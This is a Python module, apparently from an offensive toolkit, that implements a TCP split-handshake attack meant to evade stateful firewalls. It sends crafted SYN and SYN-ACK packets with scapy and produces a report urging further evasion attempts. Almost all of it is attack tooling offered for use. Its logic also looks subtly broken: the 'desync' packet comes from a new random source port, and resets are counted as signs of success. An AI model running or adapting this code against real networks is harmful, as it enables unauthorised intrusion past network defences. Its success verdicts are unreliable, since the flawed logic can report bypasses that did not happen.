"""TCP Desync via Split-Handshake for Stateful Firewall Bypass.

Sends SYN, receives SYN-ACK, then sends SYN-ACK back (instead of ACK)
to confuse stateful inspection and create bypass opportunities.

Some firewalls accept the split handshake as valid, creating a state
where the firewall thinks connection is established but the target doesn't.
"""

import logging
import time
import struct
import random
from typing import Dict, List, Optional, Tuple, Any
from dataclasses import dataclass
from enum import Enum

try:
    from scapy.all import IP, TCP, Raw, sr1, send
    HAS_SCAPY = True
except ImportError:
    HAS_SCAPY = False

logger = logging.getLogger("usare.tcp_desync")

class DesyncResult(Enum):
    BYPASS_SUCCESSFUL = "bypass_successful"
    BYPASS_FAILED = "bypass_failed"
    FIREWALL_DETECTED = "firewall_detected"
    TARGET_DETECTED = "target_detected"

@dataclass
class TCPDesyncResult:
    """TCP desync split-handshake result."""
    target_host: str
    target_port: int
    desync_result: DesyncResult
    bypass_state_created: bool
    firewall_confusion: bool
    response_time_ms: float
    bypass_technique: str
    confidence_score: float

class TCPDesyncEngine:
    """Advanced TCP desync split-handshake engine."""
    
    def __init__(self):
        self.timeout = 5.0
        
        # Desync techniques
        self.desync_techniques = {
            "syn_ack_swap": {
                "description": "Send SYN-ACK instead of ACK",
                "success_indicators": ["connection_established", "no_rst"],
                "failure_indicators": ["rst_received", "connection_reset"]
            },
            "sequence_manipulation": {
                "description": "Manipulate sequence numbers",
                "success_indicators": ["data_accepted", "connection_maintained"],
                "failure_indicators": ["connection_reset", "data_rejected"]
            },
            "window_manipulation": {
                "description": "Manipulate window sizes",
                "success_indicators": ["window_acked", "connection_stable"],
                "failure_indicators": ["window_reset", "connection_dropped"]
            },
            "flag_manipulation": {
                "description": "Manipulate TCP flags",
                "success_indicators": ["flags_accepted", "connection_progress"],
                "failure_indicators": ["flags_rejected", "connection_reset"]
            }
        }
    
    def perform_split_handshake_desync(self, target_host: str, target_port: int) -> TCPDesyncResult:
        """Perform TCP split-handshake desync attack."""
        start_time = time.time()
        
        try:
            # Step 1: Send SYN
            syn_response = self._send_syn(target_host, target_port)
            
            if not syn_response:
                return TCPDesyncResult(
                    target_host=target_host,
                    target_port=target_port,
                    desync_result=DesyncResult.BYPASS_FAILED,
                    bypass_state_created=False,
                    firewall_confusion=False,
                    response_time_ms=0.0,
                    bypass_technique="syn_failed",
                    confidence_score=0.0
                )
            
            # Step 2: Analyze SYN-ACK response
            syn_ack_analysis = self._analyze_syn_ack_response(syn_response)
            
            # Step 3: Send SYN-ACK instead of ACK (the desync)
            desync_response = self._send_syn_ack_instead_of_ack(target_host, target_port, syn_ack_analysis)
            
            # Step 4: Analyze desync result
            desync_result = self._analyze_desync_result(desync_response)
            
            response_time = (time.time() - start_time) * 1000
            
            # Calculate confidence
            confidence = self._calculate_confidence(desync_result, syn_ack_analysis, desync_response)
            
            return TCPDesyncResult(
                target_host=target_host,
                target_port=target_port,
                desync_result=desync_result,
                bypass_state_created=desync_result == DesyncResult.BYPASS_SUCCESSFUL,
                firewall_confusion=self._detect_firewall_confusion(syn_ack_analysis, desync_response),
                response_time_ms=response_time,
                bypass_technique="syn_ack_swap",
                confidence_score=confidence
            )
            
        except Exception as e:
            logger.error(f"[TCP Desync] Split-handshake failed: {e}")
            return TCPDesyncResult(
                target_host=target_host,
                target_port=target_port,
                desync_result=DesyncResult.BYPASS_FAILED,
                bypass_state_created=False,
                firewall_confusion=False,
                response_time_ms=0.0,
                bypass_technique="error",
                confidence_score=0.0
            )
    
    def _send_syn(self, target_host: str, target_port: int) -> Optional[bytes]:
        """Send SYN packet to target."""
        try:
            if not HAS_SCAPY:
                return None
            
            # Generate random sequence number
            syn_seq = random.randint(1000, 9000)
            src_port = random.randint(49152, 65535)
            
            # Create SYN packet
            syn_packet = IP(dst=target_host) / TCP(
                sport=src_port,
                dport=target_port,
                flags="S",  # SYN flag
                seq=syn_seq,
                window=8192,
                options=[("MSS", 1460)]
            )
            
            # Send packet and get response
            response = sr1(syn_packet, timeout=self.timeout, verbose=0)
            
            if response and response.haslayer(TCP):
                return bytes(response[TCP])
            
            return None
            
        except Exception as e:
            logger.debug(f"[TCP Desync] SYN send failed: {e}")
            return None
    
    def _analyze_syn_ack_response(self, syn_ack_response: bytes) -> Dict[str, Any]:
        """Analyze SYN-ACK response."""
        if not syn_ack_response:
            return {"error": "no_response"}
        
        try:
            # Parse TCP header from response
            if len(syn_ack_response) < 20:  # Minimum TCP header size
                return {"error": "invalid_response"}
            
            # Extract TCP flags
            tcp_header = struct.unpack('!HHLLBBHHH', syn_ack_response[:20])
            flags = tcp_header[5]
            
            # Extract other fields
            seq = tcp_header[2]
            ack = tcp_header[3]
            window = tcp_header[6]
            
            return {
                "flags": flags,
                "seq": seq,
                "ack": ack,
                "window": window,
                "is_syn_ack": (flags & 0x12) == 0x12,  # SYN+ACK
                "is_syn": (flags & 0x02) == 0x02,  # SYN
                "is_ack": (flags & 0x10) == 0x10,  # ACK
                "is_rst": (flags & 0x04) == 0x04,  # RST
                "is_psh": (flags & 0x08) == 0x08,  # PSH
                "is_urg": (flags & 0x20) == 0x20,  # URG
                "valid_syn_ack": True
            }
            
        except Exception as e:
            return {"error": f"parse_error: {e}"}
    
    def _send_syn_ack_instead_of_ack(self, target_host: str, target_port: int, 
                                  syn_ack_analysis: Dict[str, Any]) -> Optional[bytes]:
        """Send SYN-ACK instead of ACK to create desync."""
        try:
            if not syn_ack_analysis.get("valid_syn_ack", False):
                return None
            
            # Extract original SYN-ACK information
            original_seq = syn_ack_analysis["seq"]
            original_ack = syn_ack_analysis["ack"]
            original_window = syn_ack_analysis["window"]
            
            # Generate new sequence number for our SYN-ACK
            # We'll acknowledge their SYN but send our own SYN sequence
            new_seq = original_ack + 1
            new_ack = original_seq + 1
            
            # Create SYN-ACK packet (desync)
            src_port = random.randint(49152, 65535)
            
            syn_ack_packet = IP(dst=target_host) / TCP(
                sport=src_port,
                dport=target_port,
                flags="SA",  # SYN+ACK
                seq=new_seq,
                ack=new_ack,
                window=original_window,
                options=[("MSS", 1460)]
            )
            
            # Send packet and get response
            response = sr1(syn_ack_packet, timeout=self.timeout, verbose=0)
            
            if response and response.haslayer(TCP):
                return bytes(response[TCP])
            
            return None
            
        except Exception as e:
            logger.debug(f"[TCP Desync] SYN-ACK send failed: {e}")
            return None
    
    def _analyze_desync_result(self, desync_response: Optional[bytes]) -> DesyncResult:
        """Analyze the result of desync attempt."""
        if not desync_response:
            return DesyncResult.BYPASS_FAILED
        
        try:
            # Parse TCP response
            if len(desync_response) < 20:
                return DesyncResult.BYPASS_FAILED
            
            tcp_header = struct.unpack('!HHLLBBHHH', desync_response[:20])
            flags = tcp_header[5]
            
            # Check for RST (connection reset)
            if (flags & 0x04) == 0x04:  # RST flag
                return DesyncResult.BYPASS_FAILED
            
            # Check for ACK (acceptance)
            if (flags & 0x10) == 0x10:  # ACK flag
                return DesyncResult.BYPASS_SUCCESSFUL
            
            # Check for PSH+ACK (data acceptance)
            if (flags & 0x18) == 0x18:  # PSH+ACK
                return DesyncResult.BYPASS_SUCCESSFUL
            
            # Check for SYN+ACK (still in handshake)
            if (flags & 0x12) == 0x12:  # SYN+ACK
                return DesyncResult.FIREWALL_DETECTED
            
            return DesyncResult.BYPASS_FAILED
            
        except Exception as e:
            logger.debug(f"[TCP Desync] Result analysis failed: {e}")
            return DesyncResult.BYPASS_FAILED
    
    def _detect_firewall_confusion(self, syn_ack_analysis: Dict[str, Any], 
                                desync_response: Optional[bytes]) -> bool:
        """Detect if firewall was confused by desync."""
        try:
            if not desync_response:
                return False
            
            # Parse desync response
            tcp_header = struct.unpack('!HHLLBBHHH', desync_response[:20])
            flags = tcp_header[5]
            
            # Check for inconsistent responses
            original_flags = syn_ack_analysis.get("flags", 0)
            desync_flags = flags
            
            # Firewall confusion indicators
            confusion_indicators = [
                # Flags changed between responses
                original_flags != desync_flags,
                # Sequence numbers don't align
                # Window size changed unexpectedly
                # ACK numbers don't match expected pattern
            ]
            
            # Check for specific confusion patterns
            if (original_flags & 0x12) == 0x12:  # Original was SYN+ACK
                if (desync_flags & 0x10) == 0x10:  # Desync response is ACK
                    # This might indicate firewall accepted our desync
                    return True
                elif (desync_flags & 0x04) == 0x04:  # Desync response is RST
                    # Firewall detected invalid state and reset
                    return True
            
            return False
            
        except Exception:
            return False
    
    def _calculate_confidence(self, desync_result: DesyncResult, 
                          syn_ack_analysis: Dict[str, Any], 
                          desync_response: Optional[bytes]) -> float:
        """Calculate confidence score for desync result."""
        base_confidence = 0.5
        
        # Higher confidence for successful bypass
        if desync_result == DesyncResult.BYPASS_SUCCESSFUL:
            base_confidence += 0.3
        
        # Higher confidence for firewall confusion
        if self._detect_firewall_confusion(syn_ack_analysis, desync_response):
            base_confidence += 0.2
        
        # Higher confidence for valid responses
        if syn_ack_analysis.get("valid_syn_ack", False) and desync_response:
            base_confidence += 0.1
        
        return min(1.0, base_confidence)
    
    def generate_desync_report(self, result: TCPDesyncResult) -> str:
        """Generate human-readable TCP desync report."""
        report = []
        report.append("TCP Desync Split-Handshake Report")
        report.append("=" * 50)
        report.append(f"Target Host: {result.target_host}")
        report.append(f"Target Port: {result.target_port}")
        report.append(f"Desync Result: {result.desync_result.value}")
        report.append(f"Bypass State Created: {result.bypass_state_created}")
        report.append(f"Firewall Confusion: {result.firewall_confusion}")
        report.append(f"Bypass Technique: {result.bypass_technique}")
        report.append(f"Confidence Score: {result.confidence_score:.2f}")
        report.append("")
        
        # Desync analysis
        report.append("Desync Analysis:")
        if result.desync_result == DesyncResult.BYPASS_SUCCESSFUL:
            report.append("  - Split-handshake bypass successful")
            report.append("  - Firewall state confusion achieved")
            report.append("  - Connection state manipulation possible")
        elif result.desync_result == DesyncResult.FIREWALL_DETECTED:
            report.append("  - Firewall detected desync attempt")
            report.append("  - Stateful inspection active")
        elif result.desync_result == DesyncResult.BYPASS_FAILED:
            report.append("  - Desync attempt failed")
            report.append("  - Target properly handled invalid handshake")
        elif result.desync_result == DesyncResult.TARGET_DETECTED:
            report.append("  - Target detected manipulation attempt")
        report.append("")
        
        # Security implications
        report.append("Security Implications:")
        if result.bypass_state_created:
            report.append("  - Stateful firewall bypass possible")
            report.append("  - Connection injection opportunities exist")
            report.append("  - Further evasion techniques may succeed")
        elif result.firewall_confusion:
            report.append("  - Firewall inspection depth identified")
            report.append("  - Behavioral analysis possible")
        report.append("")
        
        # Recommendations
        report.append("Recommendations:")
        if result.bypass_state_created:
            report.append("  - Test additional evasion techniques")
            report.append("  - Monitor for connection state inconsistencies")
        elif result.firewall_confusion:
            report.append("  - Probe with different desync techniques")
            report.append("  - Analyze firewall response patterns")
        else:
            report.append("  - Target appears to have robust handling")
            report.append("  - Consider alternative attack vectors")
        report.append("")
        
        return "\n".join(report)

# Global instance
_tcp_desync_engine = None

def get_tcp_desync_engine() -> TCPDesyncEngine:
    """Get global TCP desync engine."""
    global _tcp_desync_engine
    if _tcp_desync_engine is None:
        _tcp_desync_engine = TCPDesyncEngine()
    return _tcp_desync_engine

def perform_split_handshake_desync(target_host: str, target_port: int) -> TCPDesyncResult:
    """Convenience function for TCP desync."""
    engine = get_tcp_desync_engine()
    return engine.perform_split_handshake_desync(target_host, target_port)

def generate_desync_report(result: TCPDesyncResult) -> str:
    """Convenience function for desync report generation."""
    engine = get_tcp_desync_engine()
    return engine.generate_desync_report(result)
